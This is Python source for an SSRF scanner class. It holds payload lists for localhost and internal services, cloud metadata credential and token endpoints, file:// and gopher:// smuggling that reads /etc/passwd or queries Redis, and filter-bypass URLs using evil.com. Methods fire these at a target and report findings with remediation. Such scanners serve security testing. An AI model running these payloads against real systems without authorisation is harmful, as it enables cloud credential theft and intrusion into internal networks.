"""Complete SSRF (Server-Side Request Forgery) Scanner Module.

Supports internal network access, cloud metadata endpoint testing,
protocol smuggling, and various bypass techniques.
"""

import re
import time
from typing import List, Dict, Optional, Any
from urllib.parse import urlencode, urlparse, quote

from utils.http_client import HttpClient
from utils.encoder import Encoder


class SSRFScanner:
    """Server-Side Request Forgery vulnerability scanner."""

    # URL-like parameter names
    URL_PARAM_PATTERNS = [
        'url', 'uri', 'link', 'src', 'source', 'href', 'path',
        'redirect', 'redirect_url', 'redirect_uri', 'return', 'return_url',
        'next', 'next_url', 'target', 'dest', 'destination', 'rurl',
        'domain', 'host', 'site', 'feed', 'rss', 'callback', 'webhook',
        'proxy', 'proxy_url', 'fetch', 'load', 'download', 'image',
        'image_url', 'img', 'img_url', 'avatar', 'avatar_url',
        'file', 'file_url', 'page', 'page_url', 'api', 'api_url',
        'endpoint', 'service', 'service_url', 'resource', 'open',
        'val', 'validate', 'continue', 'window', 'data', 'reference',
        'share', 'out', 'view', 'show', 'navigation', 'to', 'from',
    ]

    # Internal IP payloads
    INTERNAL_PAYLOADS = [
        # Localhost variations
        'http://127.0.0.1',
        'http://127.0.0.1:80',
        'http://127.0.0.1:443',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:8443',
        'http://127.0.0.1:3000',
        'http://127.0.0.1:9090',
        'http://localhost',
        'http://localhost:80',
        'http://localhost:8080',
        'http://0.0.0.0',
        'http://0.0.0.0:80',
        'http://[::1]',
        'http://[::1]:80',
        'http://[0000::1]',
        # Internal network ranges
        'http://10.0.0.1',
        'http://10.0.0.1:8080',
        'http://172.16.0.1',
        'http://172.16.0.1:8080',
        'http://192.168.0.1',
        'http://192.168.1.1',
        'http://192.168.1.1:8080',
        # Common internal services
        'http://127.0.0.1:6379',   # Redis
        'http://127.0.0.1:11211',  # Memcached
        'http://127.0.0.1:27017',  # MongoDB
        'http://127.0.0.1:3306',   # MySQL
        'http://127.0.0.1:5432',   # PostgreSQL
        'http://127.0.0.1:9200',   # Elasticsearch
        'http://127.0.0.1:2379',   # etcd
        'http://127.0.0.1:8500',   # Consul
    ]

    # Cloud metadata endpoints
    CLOUD_METADATA_PAYLOADS = {
        'AWS': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/hostname',
            'http://169.254.169.254/latest/meta-data/local-ipv4',
            'http://169.254.169.254/latest/meta-data/public-ipv4',
            'http://169.254.169.254/latest/meta-data/ami-id',
            'http://169.254.169.254/latest/meta-data/instance-id',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            'http://169.254.169.254/latest/api/token',
        ],
        'GCP': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
            'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
            'http://169.254.169.254/computeMetadata/v1/',
        ],
        'Azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
            'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01',
        ],
        'DigitalOcean': [
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/hostname',
            'http://169.254.169.254/metadata/v1/id',
            'http://169.254.169.254/metadata/v1/region',
        ],
        'Alibaba': [
            'http://100.100.100.200/latest/meta-data/',
            'http://100.100.100.200/latest/meta-data/instance-id',
            'http://100.100.100.200/latest/meta-data/hostname',
        ],
    }

    # Protocol/scheme payloads
    SCHEME_PAYLOADS = [
        ('file:///etc/passwd', 'root:', 'File read (Linux)'),
        ('file:///etc/hostname', '', 'File read (Linux hostname)'),
        ('file:///c:/windows/win.ini', '[fonts]', 'File read (Windows)'),
        ('file:///c:/windows/system.ini', '[boot]', 'File read (Windows)'),
        ('dict://127.0.0.1:6379/INFO', 'redis_version', 'Redis access via dict://'),
        ('dict://127.0.0.1:11211/stats', 'STAT', 'Memcached access via dict://'),
        ('gopher://127.0.0.1:6379/_INFO%0d%0a', 'redis', 'Redis via gopher://'),
        ('gopher://127.0.0.1:3306/_', 'mysql', 'MySQL via gopher://'),
        ('ftp://127.0.0.1/', '', 'FTP access'),
        ('sftp://127.0.0.1/', '', 'SFTP access'),
        ('tftp://127.0.0.1/test', '', 'TFTP access'),
        ('ldap://127.0.0.1/', '', 'LDAP access'),
        ('jar:http://127.0.0.1/test.jar!/', '', 'JAR protocol'),
        ('netdoc:///etc/passwd', 'root:', 'Netdoc protocol'),
    ]

    # Bypass payloads
    BYPASS_PAYLOADS = [
        # Decimal IP (127.0.0.1 = 2130706433)
        'http://2130706433',
        'http://2130706433:80',
        # Hex IP
        'http://0x7f000001',
        'http://0x7f.0x0.0x0.0x1',
        # Octal IP
        'http://0177.0.0.01',
        'http://0177.0000.0000.0001',
        # Mixed notation
        'http://127.1',
        'http://127.0.1',
        'http://0',
        'http://0.0.0.0',
        # IPv6 representations
        'http://[::ffff:127.0.0.1]',
        'http://[::ffff:7f00:1]',
        'http://[0:0:0:0:0:ffff:127.0.0.1]',
        # URL encoding
        'http://%31%32%37%2e%30%2e%30%2e%31',
        'http://127.0.0.1%00@evil.com',
        'http://127.0.0.1%23@evil.com',
        # DNS rebinding / special domains
        'http://localtest.me',
        'http://127.0.0.1.nip.io',
        'http://spoofed.burpcollaborator.net',
        'http://customer1.app.localhost',
        # URL parsing confusion
        'http://evil.com@127.0.0.1',
        'http://127.0.0.1#@evil.com',
        'http://127.0.0.1%2523@evil.com',
        'http://evil.com\\@127.0.0.1',
        # Redirect-based
        'http://httpbin.org/redirect-to?url=http://127.0.0.1',
        # Double URL encoding
        'http://%252f%252f127.0.0.1',
        # Enclosed alphanumeric
        'http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ',
        # CRLF in URL
        'http://127.0.0.1%0d%0a',
        # Rare IP formats for 169.254.169.254
        'http://2852039166',  # decimal
        'http://0xa9fea9fe',  # hex
        'http://0251.0376.0251.0376',  # octal
        'http://169.254.169.254.nip.io',
    ]

    def __init__(self, http_client: Optional[HttpClient] = None, timeout: float = 10.0):
        """Initialize SSRF scanner."""
        self.client = http_client or HttpClient(timeout=timeout)
        self.encoder = Encoder()
        self.findings: List[Dict[str, Any]] = []

    def scan(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test URL-like parameters for SSRF vulnerabilities.

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            List of findings
        """
        self.findings = []

        # Identify URL-like parameters
        url_params = self._identify_url_params(params)

        for param_name in url_params:
            # Test internal access
            self.findings.extend(self._test_internal(url, param_name, params))
            # Test cloud metadata
            self.findings.extend(self._test_cloud_metadata(url, param_name, params))
            # Test protocol schemes
            self.findings.extend(self._test_schemes(url, param_name, params))
            # Test bypass techniques
            self.findings.extend(self._test_bypasses(url, param_name, params))

        return self.findings

    def _identify_url_params(self, params: Dict[str, str]) -> List[str]:
        """Identify parameters that likely accept URLs."""
        url_params = []

        for param_name, value in params.items():
            # Check parameter name
            if param_name.lower() in self.URL_PARAM_PATTERNS:
                url_params.append(param_name)
                continue

            # Check if value looks like a URL
            if value.startswith(('http://', 'https://', '//', 'ftp://')):
                url_params.append(param_name)
                continue

            # Check for URL-like patterns in value
            if re.match(r'^(https?://|//|/)[^\s]+', value):
                url_params.append(param_name)
                continue

            # Partial match on param name
            if any(pattern in param_name.lower() for pattern in self.URL_PARAM_PATTERNS):
                url_params.append(param_name)

        # If nothing found, test all params
        if not url_params:
            url_params = list(params.keys())

        return url_params

    def _test_internal(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test for internal network access via SSRF.

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters

        Returns:
            List of findings
        """
        findings = []

        # Get baseline response for comparison
        try:
            baseline_resp = self.client.get(url, params=original_params)
            baseline_length = len(baseline_resp.text)
        except Exception:
            baseline_length = 0

        for payload in self.INTERNAL_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                # Check for indicators of successful internal access
                indicators = self._check_ssrf_indicators(response, payload, baseline_length)

                if indicators['is_ssrf']:
                    findings.append({
                        'type': 'Server-Side Request Forgery (Internal)',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': indicators['evidence'],
                        'remediation': 'Implement URL allowlisting. Block requests to internal/private IP ranges. Use network segmentation.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return findings  # One finding per param

            except Exception:
                continue

        return findings

    def _test_cloud_metadata(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test for cloud metadata endpoint access.

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters

        Returns:
            List of findings
        """
        findings = []

        for cloud_provider, payloads in self.CLOUD_METADATA_PAYLOADS.items():
            for payload in payloads:
                try:
                    test_params = {**original_params, param: payload}

                    # For GCP, add required header
                    headers = {}
                    if cloud_provider == 'GCP':
                        headers['Metadata-Flavor'] = 'Google'

                    response = self.client.get(url, params=test_params)

                    # Check for metadata indicators
                    metadata_indicators = {
                        'AWS': ['ami-id', 'instance-id', 'security-credentials', 'iam', 'meta-data'],
                        'GCP': ['computeMetadata', 'project-id', 'service-accounts', 'instance'],
                        'Azure': ['compute', 'vmId', 'subscriptionId', 'resourceGroupName'],
                        'DigitalOcean': ['droplet_id', 'hostname', 'region'],
                        'Alibaba': ['instance-id', 'hostname', 'meta-data'],
                    }

                    for indicator in metadata_indicators.get(cloud_provider, []):
                        if indicator.lower() in response.text.lower():
                            findings.append({
                                'type': f'SSRF - Cloud Metadata ({cloud_provider})',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"{cloud_provider} metadata endpoint accessible. Indicator: '{indicator}' found in response.",
                                'remediation': f'Block access to metadata endpoints (169.254.169.254). Use IMDSv2 (AWS). Implement network policies.',
                                'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                            })
                            return findings

                except Exception:
                    continue

        return findings

    def _test_schemes(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test various URL schemes (file://, dict://, gopher://).

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters

        Returns:
            List of findings
        """
        findings = []

        for payload, indicator, description in self.SCHEME_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                # Check for scheme-specific indicators
                if indicator and indicator.lower() in response.text.lower():
                    findings.append({
                        'type': f'SSRF - Protocol Smuggling ({description})',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f"Protocol smuggling successful: {description}. Indicator '{indicator}' found.",
                        'remediation': 'Restrict allowed URL schemes to http/https only. Implement protocol validation.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return findings

                # For file:// check for file content patterns
                if payload.startswith('file://'):
                    if re.search(r'root:.*:0:0:', response.text) or \
                       re.search(r'\[fonts\]', response.text, re.IGNORECASE):
                        findings.append({
                            'type': 'SSRF - Local File Read via file://',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Local file content returned via file:// protocol',
                            'remediation': 'Block file:// protocol. Implement URL scheme allowlist (http/https only).',
                            'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                        })
                        return findings

            except Exception:
                continue

        return findings

    def _test_bypasses(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test SSRF bypass techniques (hex IP, decimal IP, DNS rebinding).

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters

        Returns:
            List of findings
        """
        findings = []

        # Get baseline
        try:
            baseline_resp = self.client.get(url, params=original_params)
            baseline_length = len(baseline_resp.text)
        except Exception:
            baseline_length = 0

        for payload in self.BYPASS_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                indicators = self._check_ssrf_indicators(response, payload, baseline_length)

                if indicators['is_ssrf']:
                    # Determine bypass type
                    bypass_type = self._identify_bypass_type(payload)
                    findings.append({
                        'type': f'SSRF - Bypass ({bypass_type})',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': indicators['evidence'],
                        'bypass_technique': bypass_type,
                        'remediation': 'Resolve and validate the final IP address after all redirects. Use IP allowlisting at network level.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return findings

            except Exception:
                continue

        return findings

    def _check_ssrf_indicators(self, response, payload: str, baseline_length: int) -> Dict[str, Any]:
        """Check response for SSRF success indicators."""
        result = {'is_ssrf': False, 'evidence': ''}

        response_text = response.text.lower()
        response_length = len(response.text)

        # Check for common internal service responses
        internal_indicators = [
            ('redis_version', 'Redis service detected'),
            ('nginx', 'Nginx internal page detected'),
            ('apache', 'Apache internal page detected'),
            ('tomcat', 'Tomcat internal page detected'),
            ('elasticsearch', 'Elasticsearch detected'),
            ('mongodb', 'MongoDB detected'),
            ('consul', 'Consul detected'),
            ('etcd', 'etcd detected'),
            ('kubernetes', 'Kubernetes detected'),
            ('docker', 'Docker detected'),
            ('jenkins', 'Jenkins detected'),
            ('grafana', 'Grafana detected'),
            ('prometheus', 'Prometheus detected'),
            ('rabbitmq', 'RabbitMQ detected'),
            ('phpinfo', 'PHP info page detected'),
            ('server at', 'Internal server page detected'),
        ]

        for indicator, description in internal_indicators:
            if indicator in response_text:
                result['is_ssrf'] = True
                result['evidence'] = f"{description} in response to {payload}"
                return result

        # Check for significant response difference from baseline
        if baseline_length > 0:
            length_diff = abs(response_length - baseline_length)
            if length_diff > 500 and response.status_code == 200:
                # Different content returned - possible SSRF
                if any(tag in response_text for tag in ['<html', '<body', '<head', '{', '[']):
                    result['is_ssrf'] = True
                    result['evidence'] = f"Significantly different response ({response_length} vs {baseline_length} bytes) for {payload}"

        return result

    def _identify_bypass_type(self, payload: str) -> str:
        """Identify the type of SSRF bypass used."""
        if re.match(r'http://\d{8,}', payload):
            return 'Decimal IP'
        elif '0x' in payload:
            return 'Hexadecimal IP'
        elif re.match(r'http://0\d+\.', payload):
            return 'Octal IP'
        elif '[::' in payload or 'ffff' in payload:
            return 'IPv6'
        elif '@' in payload:
            return 'URL Authority Confusion'
        elif '%' in payload:
            return 'URL Encoding'
        elif 'nip.io' in payload or 'localtest.me' in payload:
            return 'DNS Rebinding'
        elif 'redirect' in payload:
            return 'Open Redirect Chain'
        elif any(c in payload for c in 'ⓛⓞⓒⓐⓛ'):
            return 'Unicode/Enclosed Alphanumeric'
        else:
            return 'Alternative Notation'
